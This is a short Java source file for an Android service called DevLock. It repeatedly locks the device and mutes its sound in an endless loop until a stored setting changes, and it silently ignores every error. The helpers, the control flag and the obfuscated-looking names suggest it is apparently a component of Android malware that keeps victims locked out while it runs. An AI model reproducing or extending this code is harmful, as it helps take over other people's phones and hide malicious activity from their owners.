package com.example.mmm.Services;

import android.app.IntentService;
import android.content.Intent;

import com.example.mmm.defines;

public class DevLock extends IntentService {
    utils utl = new utils();
    defines consts = new defines();
    public DevLock() {
        super("");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            while (true) {
                utl.chalkTile(10);
                utl.lockDevice(this);
                utl.stopSound(this);
                if (!utl.SettingsRead(this, consts.lockDevice).equals(consts.str_1)) {
                    break;
                }
            }
        }catch (Exception ex){
        }
       stopSelf();
    }
}
